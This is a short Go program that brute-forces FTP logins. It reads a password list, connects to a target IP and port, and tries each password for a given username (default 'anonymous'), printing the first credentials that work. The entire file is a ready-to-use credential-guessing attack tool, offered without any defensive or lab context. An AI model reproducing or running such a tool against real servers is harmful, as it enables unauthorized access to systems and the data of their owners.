package main

import (
    "flag"
    "fmt"
    "io/ioutil"
    "strings"
    "os"
    "github.com/jlaffaye/ftp"
)

func main() {
    username := flag.String("u", "anonymous", "username for FTP login")
    ip := flag.String("ip", "127.0.0.1:21", "IP and port for FTP login")
    passFile := flag.String("p", "ftp-password.txt", "file containing passwords to try")
    flag.Parse()

    // Open the file
    file, err := ioutil.ReadFile(*passFile)
    if err != nil {
        fmt.Println(err)
        return
    }

    // Split the file contents by newlines
    lines := strings.Split(string(file), "\n")
    found:=false
    // Iterate through each line
    for _, line := range lines {
        password := line

        // Try to log in
        client, err := ftp.Dial(*ip)
        if err != nil {
            fmt.Println(err)
            continue
        }

        // Print "Trying password"
        fmt.Printf("Trying %s:%s\n",*username,password)

        err = client.Login(*username, password)
        if err == nil {
            // If the login is successful, print the password and exit the program
            fmt.Printf("Successfully login with ip:%s username:%s password:%s\n",*ip,*username,password)
            client.Quit()
            found=true
            os.Exit(0)
        } else {
            client.Quit()
        }
    }
    if !found {
        fmt.Println("Password Not Found")
    }
}